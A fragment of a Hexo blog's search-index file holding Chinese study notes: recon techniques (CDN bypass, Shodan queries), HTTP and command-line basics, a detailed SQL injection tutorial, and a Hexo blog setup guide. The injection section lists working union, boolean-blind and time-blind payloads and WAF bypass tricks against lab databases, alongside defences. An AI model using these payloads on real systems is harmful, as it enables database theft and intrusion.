baidu.com\n\n第一段：查询参数和统计第二段：查询内容第三段：DNS返回回复第四段：显示服务器管理网站的DNS记录\n命令链接\nDNS解析内容A记录：IP地址记录AAAA记录：IPV6地址记录CNAME记录：别名记录MX记录:邮件交换记录NX记录：域名服务器记录PTR记录：反向记录TXT记录：域名相关信息记录\nCDNCDN是将源站内容分发至全国所有的节点，从而缩短用户查看对象的延迟，提高用户访问网站的响应速度与网站的可用性的技术。它能够有效解决网络带宽小、用户访问量大、网点分布不均等问题。【全球域名分发，让用户就近访问数据，速度更快】\n一个域名解析出多个IP–可能是CDN一个IP对应多个域名–泛解析（利用“*”做子域名，实现所有子域名都指向同一个IP地址)\n分辨是否用CDN1.站长工具–多地PING2.命令提示符nslookup命令解析出多个IP3.ping命令（部分）\n如何绕过CDN找到真实IP？1.DNSdb2.历史CDN记录3.从CDN本身4.网络空间引擎搜索（针对性搜索）（1）shodan搜索网络空间中在线设备，可搜索指定设备如：\n摄像头：webcam     路由器： cisco指定端口：prot:22指定服务：SSH指定国家：country:&quot;CN&quot;指定城市：city:&quot;changsha&quot;指定IP地址：host:x.x.x.x\n\n5.查询HTTPS证书\n指纹识别内容管理系统（cms）【位于WEB前端、后端办公系统或流程之间的软件系统】右击源码查看cms\nAPP查询查询软件后门程序\n"},{"title":"计算机基础","url":"/2023/08/02/bb/","content":"HTTP常见端口：iis，tomcat，阿帕奇，http，https，ftp，dns状态码：200正常300重定向400客户端错误500服务器错误\n\n\n\n码\n状态\n\n\n\n100\n继续\n\n\n200\n正常\n\n\n401\n未授权\n\n\n402\n需付费\n\n\n403\n禁止访问\n\n\n404\n无法找到\n\n\n405\n方法不被允许\n\n\n406\n无法接受\n\n\n408\n请求超时\n\n\n409\n指令冲突\n\n\n413\n请求实体过大\n\n\n414\n所请求的URL地址过长\n\n\n416\n请求的范围无法被满足\n\n\n417\n预期内容错误\n\n\n426\n需升级\n\n\n429\n请求数过多\n\n\n431\n请求的头字段过大\n\n\n450\n已被windows家长控制程序屏蔽\n\n\n500\n内部服务器错误\n\n\n507\n存量不足\n\n\n599\n错误：网络连接超时\n\n\nhttps&#x3D;http+tls&#x2F;ssl\nHTTP请求方式根据 HTTP 标准，HTTP 请求可以使用多种请求方法。HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD 方法。HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。\n\n\n\n序号\n方法\n描述\n\n\n\n1\nGET\n请求指定的页面信息，并返回实体主体。（只接收）\n\n\n2\nHEAD\n类似于GET请求，只不过返回的响应中没有具体的内容，用于获取报头\n\n\n3\nPOST\n向指定资源提交数据进行处理请求（例如提交表单或者上传文件。数据被包含在请求体中。POST 请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。\n\n\n4\nPUT\n从客户端向服务器传送的数据取代指定的文档的内容。\n\n\n5\nDELETE\n请求服务器删除指定的页面。\n\n\n6\nCONNECT\nHTTP&#x2F;1.1 协议中预留给能够将连接改为管道方式的代理服务器。\n\n\n7\nOPTIONS\n允许客户端查看服务器的性能。\n\n\n8\nTRACE\n回显服务器收到的请求，主要用于测试或诊断。\n\n\n9\nPATCH\n是对 PUT 方法的补充，用来对已知资源进行局部更新。\n\n\n数据包结构url:请求协议:&#x2F;&#x2F;ip:port&#x2F;请求资源路径？get参数\ncookie是身份验证信息，个人标识，一个人一个网站通用一个cookie,通常保存3天。cookie欺骗：伪造cookie信息伪造其他用户进行登录。\n\nreferer:来自哪个网址（从哪里访问）\n\n操作系统\nCMD 常用命令总结小技巧：\n输入 help，查看帮助；Tab 键，自动补全；上&#x2F;下方向键，查看历史命令；右键窗口标题栏 -&gt; 属性，可以修改外观样式。\n\n\nLINUX常用命令总结cd .. 返回上一级目录cd ../.. 返回上两级目录cd 进入个人的主目录cd ~user1 进入个人的主目录cd - 返回上次所在的目录pwd 显示工作路径ls 查看目录中的文件ls -F 查看目录中的文件ls -l 显示文件和目录的详细资料ls -a 显示隐藏文件ls *[0-9]* 显示包含数字的文件名和目录名tree 显示文件和目录由根目录开始的树形结构(1)lstree 显示文件和目录由根目录开始的树形结构(2)mkdir dir1 创建一个叫做 &#x27;dir1&#x27; 的目录&#x27;mkdir dir1 dir2 同时创建两个目录rm -f file1 删除一个叫做 &#x27;file1&#x27; 的文件&#x27;rmdir dir1 删除一个叫做 &#x27;dir1&#x27; 的目录&#x27;rm -rf dir1 删除一个叫做 &#x27;dir1&#x27; 的目录并同时删除其内容rm -rf dir1 dir2 同时删除两个目录及它们的内容mv dir1 new_dir 重命名/移动 一个目录cp file1 file2 复制一个文件"},{"title":"SQL注入","url":"/2023/08/11/c/","content":"SQL注入一、概述1.SQLSQL一般是指结构化查询语言,是一种特殊目的的编程语言,是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统。\n2.SQL注入原理SQL注入就是当开发人员对用户输入数据的合法性没有判断或过滤不严时,攻击者通过拼接恶意SQL语句诱使解释器在未经适当授权的情况下执行意外命令或访问数据。\n简而言之:SQL注入的原理就是攻击者通过拼接恶意SQL语句，将其带入数据库进行查询，从而得到数据库一些敏感信息。SQL注入，就是通过把SQL命令插入到WEB表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。\n3.注入条件SQL注入产生条件有三:(1) 变量可控；(2)变量未存在过滤；(3) 我们构造的SQL语句可带入数据库中查询。\n当我们了解SQL注入产生的条件时，还有一个非常重要的点需要特别注意,就是应该了解那个参数存在注入点。\n\n二、SQL注入类型1、按照注入点分类：（1）数字型注入：许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，注入点id为数字，一般被叫做数字型注入点，通过这种形式查询出后台数据库信息返回前台展示，可以构造类似以下的SQL语句进行爆破：\n\nselect xxx from 表名 where id&#x3D;1 and 1&#x3D;1。\n\n（2）字符型注入：网页链接有类似的结构http://xxx.com/users.php?name=admin 这种形式，注入点name为字符串，被称为字符型注入，可以用：\n\nselect xxx from 表名 where name&#x3D;’admin’ and 1&#x3D;1。\n\n（3）搜索型注入：主要是指在数据搜索时没有过滤搜索参数，一般在链接地址中有 “keyword&#x3D;“关键字””，注入点提交的是SQL语句。\n\nselect * from 表名 where 字段 like ‘%关键字%’ and ‘%1%’&#x3D;’%1%’。\n\n2、按照执行效果来分类：（1）基于布尔的盲注：根据页面返回判断条件真假注入。\n（2）基于时间的盲注：即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。\n（3）基于报错的注入：即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。\n\n\n单引号\n双引号\n基于数字型注入\n\n\n（4）联合查询注入：可以使用union情况下注入。\n三、SQL注入常见的绕过方法（1）大小写关键词绕过(Union)\n（2）双写关键词绕过(ununionion)\n（3）编码绕过（base64、url）\n（4）内联注释绕过（&#x2F;*! Union *&#x2F;）\n四、SQL注入-般步骤一、基于报错的注入：1.注入点判断\n2.注入点类型判断(有无回显)\n\n\n回显的类型判断:\n\n\n(1)数字型注入\n\n?id&#x3D;1 and 1&#x3D;1 – -?id&#x3D;1 and 1&#x3D;2 – -(是否报错，报错则是)\n\n(2)字符型注入\n\n?id&#x3D;1’ and 1&#x3D;1 – -?id&#x3D;1’ and 1&#x3D;2 – -(是否报错，报错即是)\n\n\n\n猜字段数:\n\n\norder by(二分法)\n\n?id&#x3D;2’ order by 6– -\n\n\n\n找回显：\n\n\n\n?id&#x3D;2’ union select 1,2,3– -\n\n二、盲注一、SQL盲注概述盲注：即在SQL注入过程中，SQL语句执行查询后，查询数据不能回显到前端页面中，我们需要使用一些特殊的方式来判断或尝试，这个过程称为盲注。\n1.如果数据库运行返回结果时只反馈对错不会返回数据库中的信息 此时可以采用逻辑判断是否正确的盲注来获取信息。2.盲注是不能通过直接显示的途径来获取数据库数据的方法。在盲注中，攻击者根据其返回页面的不同来判断信息（可能是页面内容的不同，也可以是响应时间不同，一般分为三类）\n3.需要掌握的函数：substr用法索引开始从1开始ascii用法length用法\n二、布尔盲注原理：盲注查询是不需要返回结果的，仅判断语句是否正常执行即可，所以其返回可以看到一个布尔值，正常显示为true，报错或者是其他不正常显示为False\n流程：\n\n\n求闭合字符\n求当前数据库的长度\n求当前数据库表对应的ASCII\n求当前数据库中表的数量\n求当前数据库表中其中一个表的表名长度\n求当前数据库中其中一个表的表名对应的ASCII\n求字段的数量\n求字段内容的长度\n求字段内容对应的ascii\n\n\n?id=1(?id=1&#x27;)#1.判断闭合类型?id=1&#x27; and length(database()) &gt;= 8 -- -?id=1&#x27; and length(database()) &lt;= 8 -- -?id=1&#x27; and length(database()) = 8 -- -  大于小于二分法判断=确定长度#2.求数据库的长度 ?id=1&#x27; and substr(database(),$1$,1) = &#x27;$s$&#x27; -- -#3.求数据库对应的ascii值（表名）：判断数据库从第一位开始的每一位字母(选中部分进入burp进行音叉或集束炸弹爆破，第一位范围为2步数据长度范围，从1到求出长度 ；第二位从1到128进行ascii码爆破，按长度筛选出不同的长度即为表名)#4.求当前数据库中表的数量1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=$1$ # 显⽰不存在1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=$2$ # 显⽰存在注释：原理是使用count()这个函数来判断table_name这个表的数量有几个然后后面有一个where判断来指定是当前数据库在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常#5.求数据库中表名的长度：用&gt;,&lt;,二分法进行判断长度第一个表名长度：&#x27;and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1))=6 -- -第二个表名长度: &#x27;and length((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 1,1))=8 -- -#6.求当前数据库中其中一个表的表名对应的ASCII语法格式是：1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),n,1))&gt;97 i 是第几个表n 是第几个字符查询第一个表的第一位字符&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit $0$,1),$1$,1))=&#x27;$117$&#x27; -- -查询第二个表的第二个字符&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit $1$,1),$2$,1))=&#x27;$117$&#x27;  -- -#7、猜解字段的数量：判断表名users的字段数量是否为81&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=$8$ #8、猜解字段的长度：猜解第一个字段的长度是否为71&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1))=&quot;$7$&quot;猜解第二个字段的长度是否为101&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1))=&quot;$10$&quot; #9、猜解字段的名字：如果想查询第n个字段，那么就使用这个语句：1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit i,1),n,1))=&#x27;$101$&#x27;注释：i代表查询第几个表n代码查询列的第几个字符猜解 dvwa.users 表下的 user 列的第一个字段内容为：a1&#x27; and ascii(substr((select user from dvwa.users limit 0,1),1,1))=&quot;$97$&quot;暴力猜解：猜解 user 字段值是否为 admin1&#x27; and (select count(*) from users where user = &#x27;admin&#x27;) = 1 \n三、时间盲注时间盲注又称延迟注入，适用于页面不会返回错误信息，只会回显一种界面，其主要特征是利用sleep函数，制造时间延迟，由回显时间来判断是否报错。\n官方理解：利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。\nif（判断语句，x，y）如果判断语句正确则输出X，否则输出Ysleep(X)函数，延迟X秒后回显if(1&#x3D;1,1,sleep(1))即输出1if(1&#x3D;2,1,sleep(1))即延迟一秒后回显\n【闭合】结果就是如果构成闭合，则会执行闭合后的代码，且闭合内部的代码并不会被执行\n判断库名长度\n\n?id&#x3D;1’ and if(length(database())&gt;8,sleep(2),0) –+\n\n判断库名\n\n?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,sleep(2),0) –+此为判断第一个字母的ascii码是否为115\n\n判断表名\n?id=1’ and if(ascii(substr((select table_name from information_schema.tables where table_schema=‘security’ limit x,y),z,d))=e,sleep(1),0)–-+其中x代表第x+1个表，y表示第x+1往后y个单位的表，z表示第几个字母，d表示z往后d个单位的字母\n判断列名\n?id=1’ and If(ascii(substr((select column_name from information_schema.columns where table_name=‘users’ and table_schema=database() limit x,y),z,d))=105,sleep(2),1)–+x：第x+1个列，y：x+1个列往后y个单位，z：x+1列的第一个字母，d：第一个字母往后的第z个单位\n依次往下爆，得到第一列：id第二列：username第三列：password\n爆数据\n\n?id&#x3D;1’ and If(ascii(substr((select username from users limit 0,1),1,1))&#x3D;68,sleep(2),1)–+\n\n相关函数：\n\n找数据库 database()在一行显示 group_concat()\n常用系统函数：\n\n\n\n\n基础信息函数\n功能\n\n\n\nsystem_user()\n系统用户名\n\n\nuser()\n用户名\n\n\ncurrent_user()\n当前用户名\n\n\nsession_user()\n连接数据库的用户名\n\n\ndatabase()\n数据库名\n\n\nversion()\n数据库版本\n\n\n@@datadir\n数据库路径\n\n\n@@basedir\n数据库安装路径\n\n\n@@version_compile_os\n操作系统\n\n\ncount()\n返回执行结果数量\n\n\nsleep()\n延时\n\n\n\n\n\n\n\n字符处理函数\n功能\n举例\n\n\n\n重点 concat()\n没有分隔符地连接字符串\nselect concat(c1,c2) from xxx\n\n\n重点 concat_ws()\n指定分隔符地连接字符串\nselect concat_ws(‘:’,c1,c2) from xxx\n\n\n重点 group_concat()\n以逗号分隔某列&#x2F;组的数据\nselect group_concat(c1,c2) from xxx\n\n\nload_file()\n读取服务器文件\nselect loadfile(‘&#x2F;tmp&#x2F;a.txt’)\n\n\ninto outfile\n写入文件到服务器\nselect ‘xxxx’ into outfile ‘&#x2F;tmp&#x2F;a.txt’\n\n\nascii()\n字符串的ASCII代码值\nselect ascii(‘a’)\n\n\nord()\n返回字符串第一个字符的ASCII值\nselect ord(‘abc’)\n\n\nchar()\n返回ASCII值对应的字符串\nselect char(97)\n\n\nmid()\n返回一个字符串的一部分\nselect mid(‘abcde’,1,1)\n\n\nsubstr()\n返回一个字符串的一部分\nselect substr(‘abcde’,1,1)\n\n\nlength()\n返回字符串的长度\nselect length(‘abc’)\n\n\nleft()\n返回字符串最左面几个字符\nselect left(‘mysql’,2)\n\n\nfloor()\n返回小于或等于X的最大整数\nselect floor(5.1)\n\n\nrand()\n返回0-1间的一个随机数\nselect rand()\n\n\nif()\n三目运算\nselect if(1&gt;2,’A’,’B’)\n\n\nstrcmp()\n比较字符串ASCII大小\nselect strcmp(‘c’,’b’)\n\n\nifnull()\n参数1为不null则返回参数1,否则参数2\nselect ifnull(null,2)\n\n\n\n\n\n找表名:\n\n\n?id=2&#x27; and 1=2 union select 1,group_concat(table_name),@@basedir from information_schema.tables where table_schema=&quot;security&quot;-- -2,3为回显位；union前必须为错才能执行union语句\n\n\n\n找字段名：\n\n\n?id=2&#x27; and 1=2 union select 1,group_concat(column_name),@@basedir from information_schema.columns where table_name=&quot;emails&quot;-- -爆emails表的列名\n\n\n\n爆记录：\n\n\n?id=2&#x27; and 1=2 union select 1,group_concat(id,email_id),3 from emails-- -选择需要的列爆记录\n\n\n\n查看内容：\n\n\n?id=2&#x27; and 1=2 union select 1,group_concat(id),group_concat(email_id) from emails-- -分开一一对应显示\n\n\n\n3.信息猜解(库名到表名列名到具体数据)\n判断一个链接是否存在注入漏洞，可以通过对其传入的参数(但不仅仅只限于参数，还有cookie注入,HTTP头注入等)进行构造， 然后对服务器返回的内容进行判断来查看是否存在注入点。\n注入点又分为有回显和无回显，有回显就是当我们输入恶意SQL语句时，页面会给我们一个反馈的信息,例如我们语句输入错误，后台就会把错误信息返回显示在网页上,而无回显就恰恰相反,当我们无论输入的SQL是正确或者错误，页面都不会发生改变。\n五、危害1.数据库信息泄露数据库中存放的用户的隐私信息的泄露。\n2.网页篡改通过操作数据库对特定网页进行篡改。\n3.网站被挂，传播恶意软件修改数据库一些字段的值，嵌入链接，实行攻击。\n4.数据库被恶意操作数据库服务器被攻击，数据库的系统管理员账户被篡改。\n5.服务器被远程控制经由数据库服务器提供的操作系统支持，可以修改或者控制操作系统。\n6.破坏硬盘数据，系统瘫痪\n六、注入应对方案1、参数过滤参数过滤以各种厂商以及代码的WAF为主,比如替换空格,关键字,双写,大小写,特殊字符转义。2、预编译预编译主要依赖各种框架,比如Java的mybatis框架 和 PHP的 thinkphp框架。3、限制权限和报错限制权限和报错是指限制数据库的权限,以及控制数据库的报错信息,报错信息不要对外展示。\n"},{"title":"利用github搭建我的第一个hexo博客","url":"/2023/07/27/hello-world/","content":"准备前提1.提前安装好(node.js)[https://nodejs.org/en] 左边的那个2.提前安装好(GIt)[https://git-scm.com/downloads]3.提前注册好一个github账号4.如果文章图片没有显示，请自行挂代理\n操作步骤1.在本地找个目录放博客源文件，路径不要有中文2.在选定的目录中，右键Git Bash Here3.使用npm命令安装Hexo，输入：\nnpm install -g hexo-clihexo init blogcd bloghexo g \n\n构建好的效果如下：\n\n4.检查网站雏形\nhexo new x新建一个名为x的网页模块hexo ghexo s完成后可以通过本机IP地址：4000预览页面\n&gt;hexo clean &gt;清除页面设置&gt;hexo g&gt;hexo d #部署，可与hexo g 合并为 hexo d -g&gt;输入d后等待一会完成博客部署\n\n5.配置ssh\n\ncd ~&#x2F;.ssh #检查本机已存在的ssh密钥\n\n\n如果提示：No such file or directory 说明你是第一次使用git。\n\n\nssh-keygen -t rsa -C “邮件地址”\n\n\n然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：\n\n\n\nkey填写C:\\Users\\Administrator.ssh\\id_rsa.pub中的内容\n\n尝试ssh连接,测试是否成功\n\n\n\nssh -T &#x67;&#x69;&#x74;&#x40;&#x67;&#105;&#116;&#x68;&#117;&#x62;&#x2e;&#99;&#x6f;&#109; # 注意邮箱地址不用改\n\n\n如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，然后会看到下面这个，就算成功：\n\n\nHi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.\n\n\n在选中的位置(blog目录下)打开cmd(以管理员身份)\n\n\nnpm install hexo-deployer-git –save\n\n\n在上一个Git Bash Here还需要继续配置\n\n\ngit config –global user.name “xxx”&#x2F;&#x2F; 你的github用户名，非昵称git config –global user.email “&#120;&#x78;&#x78;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#109;“&#x2F;&#x2F; 填写你的github注册邮箱\n\n6.准备上传代码\n\n在github上新建一个存储库，命名为github的用户名.github.io\n\n编辑_config.yml文件，在最后改成这样\n\n\ndeploy:\ttype: git\trepository: git@github.com:xxx/xxx.github.io.git\tbranch: main\n\n!\n\n注意保持格式，缩进不对，会导致一会儿，上传不成功\n\n最后上传\n\n\n在创建的存储库的设置中-pages-如图设置\n!\n\n\n7.hexo命令介绍\nhexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章hexo new page &quot;pageName&quot; #新建页面hexo g == hexo generate #生成hexo s == hexo server #启动服务预览hexo d == hexo deploy #部署\nhexo server #Hexo会监视文件变动并自动更新，无须重启服务器hexo server -s #静态模式hexo server -p 5000 #更改端口hexo server -i 192.168.1.1 #自定义 IPhexo clean #清除缓存，若是网页正常情况下可以忽略这条命令hexo version  #查看Hexo的版本hexo generate #生成静态页面至public目录\n\n\nhexo s -g #生成并本地预览hexo d -g #生成并上传\n\n8.hexo目录结构\n+– .deploy #hexo deploy生成的文件+– node_modules #npm组件+– public #生成的静态网页文件+–scaffolds #模板+– source #博客正文和其他源文件| +– _posts #我们自己写的文章以md结尾+– themes #主题+– _config.yml #全局配置文件– package.json #定义了hexo所需要的各种模块\n\n9.markdown语法(typora)\n"},{"title":"欢迎光临地下室","url":"/2023/07/26/wuu/","content":"阴暗地爬行阴暗地爬行阴暗地爬行阴暗地爬行阴暗地爬行(:靴洗针的狠剪丹:)\n"}]